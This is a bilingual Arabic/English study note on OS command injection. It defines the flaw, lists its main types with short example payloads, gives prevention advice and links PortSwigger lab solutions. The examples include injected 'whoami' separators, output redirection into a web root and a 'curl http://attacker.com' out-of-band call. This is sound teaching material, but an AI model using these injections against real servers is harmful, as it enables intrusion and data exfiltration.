# Command Injection (OS Command Injection) | حقن الأوامر

> **OWASP Category:** [A03 - Injection](../README.md)  
> **Methodology:** [Step-?? - Command Injection Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Command-Injection-Testing.md)  
> **PortSwigger Labs:** [Solutions](../../../portswigger-labs/Server-Side/Command-Injection/)

---

## 📌 Definition (التعريف)

> ثغرة Command Injection تحدث عندما يستدعي التطبيق أوامر النظام (System Commands) ويمرر لها مدخلات المستخدم دون فلترة. المهاجم يستغل هذه النقطة لحقن أوامر إضافية يراها السيرفر جزءاً من التعليمات الأصلية فيقوم بتنفيذها. هذه الثغرة خطيرة جداً لأنها تعطي المهاجم تحكماً كاملاً في السيرفر (RCE)، وليس فقط في الموقع نفسه.

---

## 🧩 أنواعها الرئيسية | Main Types

- **حقن مباشر (In-Band Command Injection)**: تنفيذ الأمر ورؤية النتيجة مباشرة في استجابة السيرفر، مثل إضافة `; whoami` بعد المدخل الأصلي.

- **حقن أعمى مع تأخير زمني (Blind - Time Delays)**: استخدام أمر مثل `sleep` لاختبار وجود الثغرة من خلال مراقبة زمن استجابة السيرفر.

- **حقن أعمى مع إعادة توجيه الناتج (Blind - Output Redirection)**: كتابة نتيجة الأمر إلى ملف يمكن الوصول إليه لاحقاً، مثل `whoami > /var/www/static/result.txt`.

- **حقن أعمى مع تفاعل خارجي (Blind - Out-of-Band/OAST)**: إجبار السيرفر على الاتصال بخادم خارجي مثل `curl http://attacker.com` لتأكيد الثغرة واستخراج البيانات.

- **حقن مع مشغلات متعددة (Multiple Separators)**: تجربة فواصل أوامر مختلفة مثل `;`، `&&`، `|`، `||` حسب نظام التشغيل المستهدف.

---

## 🛡️ How to Prevent (كيف تمنعها)

- **تجنب استدعاء أوامر النظام قدر الإمكان:** استخدم دوال مدمجة في اللغة بدلاً من استدعاء System Commands مباشرة.

- **استخدام قائمة بيضاء (Whitelist) للمدخلات:** إذا كنت مضطراً لاستخدام أوامر النظام، حدد قائمة بالقيم المسموحة فقط (مثل أرقام IP بصيغة محددة).

- **تنقية المدخلات:** ارفض أي مدخلات تحتوي على مشغلات الأوامر (;, &&, |, $() إلخ).

- **الهروب من المدخلات (Input Escaping):** استخدم دوال الهروب المخصصة للـ Shell الموجودة في لغة البرمجة للتخلص من خطورة الرموز الخاصة.

- **تشغيل التطبيق بصلاحيات محدودة:** لا تشغل التطبيق بصلاحيات `root`؛ استخدم صلاحيات محدودة تقلل الضرر في حال نجاح الاختراق.

---

## 🔍 كيفية اكتشافها في منهجيتي | How to Find in My Methodology

> 📂 **راجع ملف المنهجية التفصيلي:**  
> [Web-Pentest-Methodology - Phase 3 - Command Injection Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Command-Injection-Testing.md)

---

## 🧪 مختبرات PortSwigger | PortSwigger Labs

| المختبر | الصعوبة | الحل |
|---------|--------|------|
| OS command injection, simple case | Apprentice | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/01-simple-case.md) |
| Blind OS command injection with time delays | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/02-blind-time-delays.md) |
| Blind OS command injection with output redirection | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/03-blind-output-redirection.md) |
| OS command injection with out-of-band interaction | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/04-blind-oast.md) |
| Blind OS command injection with out-of-band exfiltration | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/05-blind-oast-exfiltration.md) |
